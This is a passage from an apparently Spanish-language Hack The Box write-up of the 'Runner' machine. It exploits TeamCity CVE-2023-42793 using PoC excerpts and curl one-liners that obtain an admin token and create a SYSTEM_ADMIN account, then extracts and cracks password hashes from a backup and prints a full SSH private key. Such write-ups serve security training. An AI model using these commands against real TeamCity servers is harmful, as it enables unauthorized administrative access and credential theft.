<p><a href="/assets/img/htb-writeup-runner/runner2.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner2.png" alt="" loading="lazy"></a></p>

<h3 id="enumeracion-web-team-city"><span class="me-2">Enumeracion Web Team City</span><a href="#enumeracion-web-team-city" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Que es TeamCity?</p>

<p>Está diseñado para mejorar el proceso de desarrollo de software mediante la automatización de tareas rutinarias como la creación, prueba e implementación de código . TeamCity se destaca por su interfaz fácil de usar, su integración integral con sistemas de control de versiones y sus amplias capacidades de creación, prueba e implementación</p>

<p>bien!!! tenemos un panel de login de esta app, tenemos que tratar de bypassear este panel. Una vez dentro imagino que habran usuarios y administradores, la version es la 2023.05.03</p>

<p>Si realizamos una busqueda en searchsploit?</p>

<p><a href="/assets/img/htb-writeup-runner/runner3.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner3.png" alt="" loading="lazy"></a></p>

<p>Tenemos un PoC, pero nosotros vamos a leer el codigo y tratar de explotarlo de forma manual.</p>

<h3 id="explotacion-cve-2023-42793"><span class="me-2">Explotacion [CVE-2023-42793]</span><a href="#explotacion-cve-2023-42793" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="k">if</span> <span class="n">url</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">https://</span><span class="sh">"</span><span class="p">):</span>
    <span class="n">curl_command</span> <span class="o">=</span> <span class="sh">"</span><span class="s">curl -k</span><span class="sh">"</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">curl_command</span> <span class="o">=</span> <span class="sh">"</span><span class="s">curl</span><span class="sh">"</span>

<span class="n">get_token_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/app/rest/users/id:1/tokens/RPC2</span><span class="sh">"</span>
<span class="n">delete_token_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/app/rest/users/id:1/tokens/RPC2</span><span class="sh">"</span>
<span class="n">create_user_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/app/rest/users</span><span class="sh">"</span>

<span class="n">create_user_command</span> <span class="o">=</span> <span class="sh">""</span>
<span class="n">token</span> <span class="o">=</span> <span class="sh">""</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">get_token_url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>En esta parte hace una validacion por si la web tiene SSL, si tiene hace un <code class="language-plaintext highlighter-rouge">curl -K</code> de lo contrario realiza un curl normal. Luego hace una llamada por POST a <code class="language-plaintext highlighter-rouge">/app/rest/users/id:1/tokens/RPC2</code> esto te genera un token con privilegios, es ahi donde esta el fallo de TeamCity:</p>

<p>El endpoint <code class="language-plaintext highlighter-rouge">/app/rest/users/id:1/tokens/RPC2</code> se encuentra expuesto al publico sin requerir autenticacion, de aqui se puede conseguir un token de autenticacion con privilegios elevados.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="k">elif</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">404</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Token already exists</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">delete_command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">curl_command</span><span class="si">}</span><span class="s"> -X DELETE </span><span class="si">{</span><span class="n">delete_token_url</span><span class="si">}</span><span class="sh">'</span>
    <span class="n">delete_process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">(</span><span class="n">delete_command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
    <span class="n">delete_process</span><span class="p">.</span><span class="nf">wait</span><span class="p">()</span>
    <span class="n">delete_output</span> <span class="o">=</span> <span class="n">delete_process</span><span class="p">.</span><span class="nf">communicate</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">delete_process</span><span class="p">.</span><span class="n">returncode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Previous token deleted successfully</span><span class="se">\n</span><span class="s">run this command again for creating new token &amp; admin user.</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Failed to delete the previous token</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>no se pueden generar 2 tokens, pero hay una manera de borrar el token actual que generamos con el Metodo <code class="language-plaintext highlighter-rouge">curl -X DELETE</code></p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="k">if</span> <span class="n">token</span><span class="p">:</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">Authorization</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span>
    <span class="p">}</span>
    <span class="n">random_chars</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
    <span class="n">username</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">city_admin</span><span class="si">{</span><span class="n">random_chars</span><span class="si">}</span><span class="sh">"</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Main_password!!**</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">angry-admin@funnybunny.org</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">roles</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">role</span><span class="sh">"</span><span class="p">:</span> <span class="p">[{</span><span class="sh">"</span><span class="s">roleId</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">SYSTEM_ADMIN</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">scope</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">g</span><span class="sh">"</span><span class="p">}]}</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Luego entramos a esta parte que es la mas interesante, una vez que tengamos el token podemos crear un usuario con privilegios de la siguiente manera, en el PoC agrega las cabezeras <code class="language-plaintext highlighter-rouge">Authorization: Bearer {token}</code> y <code class="language-plaintext highlighter-rouge">Content-Type: application/json</code>, este exploit crea un usario aleatorio pasandole caracteres extraños, nosotros vamos a modificar eso. En data vamos a poner el nombre de usuario que nosotros queremos y en password lo mismo. Ya Les Muestro un Oneliner potente en <code class="language-plaintext highlighter-rouge">CURL</code></p>

<p>Antes de continuar hay que saber lo siguiente: este metodo solo nos crea un usuario con privilegios pero existe otra manera de la cual nos podemos aprovechar ejecutando comandos desde un endpoint. Esto lo vamos a ver despues</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2"</span>

&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">"yes"</span>?&gt;&lt;token <span class="nv">name</span><span class="o">=</span><span class="s2">"RPC2"</span> <span class="nv">creationTime</span><span class="o">=</span><span class="s2">"2024-10-28T14:08:19.584Z"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2"</span>/&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>en <code class="language-plaintext highlighter-rouge">value</code> nos sale el token que obtuvimos, este servira para el siguiente onliner. Estaria ubicandolo en <code class="language-plaintext highlighter-rouge">Authorization: eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://teamcity.runner.htb/app/rest/users"</span> <span class="nt">-H</span> <span class="s1">'Authorization: {TOKEN}'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"email": "atreus@runner.htb", "username": "atreus", "password": "atreus123$!", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'</span>

&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">"yes"</span>?&gt;&lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">"atreus"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"11"</span> <span class="nv">email</span><span class="o">=</span><span class="s2">"atreus@runner.htb"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/app/rest/users/id:11"</span><span class="o">&gt;</span>&lt;properties <span class="nv">count</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/app/rest/users/id:11/properties"</span><span class="o">&gt;</span>&lt;property <span class="nv">name</span><span class="o">=</span><span class="s2">"addTriggeredBuildToFavorites"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"true"</span>/&gt;&lt;property <span class="nv">name</span><span class="o">=</span><span class="s2">"plugin:vcs:anyVcs:anyVcsRoot"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"atreus"</span>/&gt;&lt;property <span class="nv">name</span><span class="o">=</span><span class="s2">"teamcity.server.buildNumber"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"129390"</span>/&gt;&lt;/properties&gt;&lt;roles&gt;&lt;role <span class="nv">roleId</span><span class="o">=</span><span class="s2">"SYSTEM_ADMIN"</span> <span class="nv">scope</span><span class="o">=</span><span class="s2">"g"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/app/rest/users/id:11/roles/SYSTEM_ADMIN/g"</span>/&gt;&lt;/roles&gt;&lt;<span class="nb">groups </span><span class="nv">count</span><span class="o">=</span><span class="s2">"1"</span><span class="o">&gt;</span>&lt;group <span class="nv">key</span><span class="o">=</span><span class="s2">"ALL_USERS_GROUP"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"All Users"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"/app/rest/userGroups/key:ALL_USERS_GROUP"</span> <span class="nv">description</span><span class="o">=</span><span class="s2">"Contains all TeamCity users"</span>/&gt;&lt;/groups&gt;&lt;/user&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>el resultado es la creacion de un usuario con privilegios de administrador</p>

<p><a href="/assets/img/htb-writeup-runner/runner4.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner4.png" alt="" loading="lazy"></a></p>

<h3 id="intrusion-via-web"><span class="me-2">Intrusion Via Web</span><a href="#intrusion-via-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Una vez dentro de la aplicacion web podemos ir a la parte de administracion y abajo nos vamos a encontrar con una seccion de <code class="language-plaintext highlighter-rouge">BACKUP</code></p>

<p><a href="/assets/img/htb-writeup-runner/runner5.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner5.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-runner/runner6.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner6.png" alt="" loading="lazy"></a></p>

<p>Haciendo click en Start Backup se descargara un archivo ZIP. Una vez en tenencia del archivo vamos a descomprimirlo</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre></td><td class="rouge-code"><pre>7z l TeamCity_Backup_20241028_142213.zip 

7-Zip 24.07 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2024 Igor Pavlov : 2024-06-19
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 266056 bytes <span class="o">(</span>260 KiB<span class="o">)</span>

Listing archive: TeamCity_Backup_20241028_142213.zip

<span class="nt">--</span>
Path <span class="o">=</span> TeamCity_Backup_20241028_142213.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 266056
Comment <span class="o">=</span> TeamCity data backup<span class="p">;</span> ZIP factory <span class="k">in </span>use: memory-conservative <span class="o">(</span>dynamic, shared<span class="o">)</span><span class="p">;</span> compression level <span class="nt">-1</span><span class="nb">.</span>

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2024-10-28 14:22:12 .....           92           70  version.txt
2024-10-28 14:22:12 .....           45           47  metadata/metadata-version.dat
2024-10-28 14:22:12 .....            6            8  charset
2024-10-28 14:22:12 .....          637          310  metadata/backup.config
2024-10-28 14:22:12 .....        67388        11783  metadata/schema.config
2024-10-28 14:22:12 .....           50           46  database_dump/db_version
2024-10-28 14:22:12 .....       112098        18694  database_dump/meta_file_line
2024-10-28 14:22:12 .....           14           16  database_dump/single_row
2024-10-28 14:22:12 .....           88           86  database_dump/server_property
2024-10-28 14:22:12 .....          121           97  database_dump/backup_info
2024-10-28 14:22:12 .....          151          123  database_dump/domain_sequence
2024-10-28 14:22:12 .....          149          128  database_dump/project
2024-10-28 14:22:12 .....           95           65  database_dump/vcs_root
2024-10-28 14:22:12 .....           85           53  database_dump/project_mapping
2024-10-28 14:22:12 .....           46           43  database_dump/vcs_root_mapping
2024-10-28 14:22:12 .....           90           68  database_dump/agent_pool
2024-10-28 14:22:12 .....           88           82  database_dump/usergroups
2024-10-28 14:22:12 .....          428          309  database_dump/users
2024-10-28 14:22:12 .....          926          326  database_dump/user_property
2024-10-28 14:22:12 .....          257          136  database_dump/usergroup_notification_events
2024-10-28 14:22:12 .....          373          165  database_dump/usergroup_watch_type
2024-10-28 14:22:12 .....          129           83  database_dump/usergroup_notification_data
2024-10-28 14:22:12 .....           53           55  database_dump/remember_me
2024-10-28 14:22:12 .....          286          219  database_dump/permanent_tokens
2024-10-28 14:22:12 .....           48           45  database_dump/user_projects_visibility
2024-10-28 14:22:12 .....           51           49  database_dump/agent_pool_project
2024-10-28 14:22:12 .....          135           93  database_dump/vcs_username
2024-10-28 14:22:12 .....           42           43  database_dump/build_queue_order
2024-10-28 14:22:12 .....          125           87  database_dump/user_roles
2024-10-28 14:22:12 .....           71           58  database_dump/usergroup_roles
2024-10-28 14:22:12 .....          370          208  database_dump/stats_publisher_state
2024-10-28 14:22:12 .....          690          320  database_dump/comments
2024-10-28 14:22:12 .....          346          167  database_dump/action_history
2024-10-28 14:22:12 .....          766          293  database_dump/audit_additional_object
2024-10-28 14:22:12 .....         1543          341  database_dump/server_statistics
2024-10-28 14:22:12 .....        27042         2291  database_dump/node_tasks
2024-10-28 14:22:12 .....          116          110  database_dump/node_locks
2024-10-28 14:22:12 .....          163          122  database_dump/server_health_items
2024-10-28 14:22:12 .....           25           24  database_dump/hidden_health_item
2024-10-28 14:22:12 .....         1182          350  database_dump/config_persisting_tasks
2024-10-28 14:22:12 .....           24           26  database_dump/server
2024-10-28 12:47:24 .....          311          204  config/_notifications/ide_notificator/tests_unmuted.ftl.dist
2024-10-28 12:46:38 .....        24199         2312  config/_logging/debug-commit-status.xml
2024-10-28 12:47:24 .....          434          274  config/_notifications/ide_notificator/build_probably_hanging.ftl.dist
</pre></td></tr></tbody></table></code></div></div>

<p>backups de bases de datos, quizas podemos encontrar algunos hashes crackeables. Antes de seguir con eso y no volvernos locos a la hora de enumerar estas bases de datos, vamos a buscar en teamcity que usuarios validos tenemos:</p>

<p><a href="/assets/img/htb-writeup-runner/runner7.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner7.png" alt="" loading="lazy"></a></p>

<ul>
  <li>Admin
    <ul>
      <li>John -&gt; <code class="language-plaintext highlighter-rouge">John@runner.htb</code></li>
    </ul>
  </li>
  <li>Matthew
    <ul>
      <li>Matthew -&gt; <code class="language-plaintext highlighter-rouge">Matthew@runner.htb</code></li>
    </ul>
  </li>
</ul>

<p>Usuarios validos a nivel de sistema, tenemos el puerto 22 abierto esto quiere decir que la shell tiene que venir por ese puerto.</p>

<p>Lo siguiente sera filtrar con el comando <code class="language-plaintext highlighter-rouge">grep</code> por hashes para crackearlos</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nb">grep</span> <span class="nt">-ri</span> <span class="s2">"john"</span>
database_dump/comments:201, <span class="nt">-42</span>, 1709746543407, <span class="s2">"New username: </span><span class="se">\'</span><span class="s2">admin</span><span class="se">\'</span><span class="s2">, new name: </span><span class="se">\'</span><span class="s2">John</span><span class="se">\'</span><span class="s2">, new email: </span><span class="se">\'</span><span class="s2">john@runner.htb</span><span class="se">\'</span><span class="s2">"</span>
database_dump/users:1, admin, <span class="nv">$2a$07$neV5T</span>/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1730124582065, BCRYPT

<span class="nb">grep</span> <span class="nt">-ri</span> <span class="s2">"matthew"</span>
database_dump/vcs_username:2, anyVcs, <span class="nt">-1</span>, 0, matthew
database_dump/users:2, matthew, <span class="nv">$2a$07$q</span>.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
config/_trash/AllProjects.project1/project-config.xml:  &lt;description&gt;Matthew<span class="s1">'s projects&lt;/description&gt;
config/projects/AllProjects/project-config.xml.1:  &lt;description&gt;Matthew'</span>s projects&lt;/description&gt;
system/pluginData/audit/configHistory/projects/project1/config.xml.1:  &lt;description&gt;Matthew<span class="s1">'s projects&lt;/description&gt;
</span></pre></td></tr></tbody></table></code></div></div>

<p>logramos ver el hash de admin y matthew que son los usuarios a nivel de sistema o contenedor.</p>

<ul>
  <li>admin
    <ul>
      <li>$2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye</li>
    </ul>
  </li>
  <li>matthew
    <ul>
      <li>$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em</li>
    </ul>
  </li>
</ul>

<p>vamos intentar crackearlos con <code class="language-plaintext highlighter-rouge">johntheripper</code> pasandole el diccionario <code class="language-plaintext highlighter-rouge">rockyou.txt</code> que es un diccionario grande y tipico en estos ataques de crackeo de contraseñas.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>john <span class="nt">--show</span> <span class="nb">hash</span>                                     
?:piper123

1 password <span class="nb">hash </span>cracked, 0 left
</pre></td></tr></tbody></table></code></div></div>

<p>solo nos crackea uno, el otro hash queda ahi… vamos a intentar entrar por ssh con esta contraseña pasandole el usuario john y matthew pero no sirve para ninguno, asi que no perdamos tiempo con esto. Vamos a seguir enumerando buscando alguna id_rsa</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre>find <span class="nb">.</span> <span class="nt">-name</span> <span class="s2">"id_rsa"</span> 2&gt;/dev/null | <span class="nb">cat</span> ./config/projects/AllProjects/pluginData/ssh_keys/id_rsa 
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
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
<span class="nv">KgK8c9z2ecgZsAAAALam9obkBydW5uZXI</span><span class="o">=</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Bingo…. Tenemos una clave privada id_rsa para entrar por ssh y ejecutar comandos, muy bien… ya llegamos hasta esta parte… ahora voy a explicar otra manera para conseguir RCE en la maquina…. nos vamos a aprovechar de un endpoint de teamcity.</p>

<h3 id="intrusion-via-web-metodo-2"><span class="me-2">Intrusion Via Web Metodo 2</span><a href="#intrusion-via-web-metodo-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

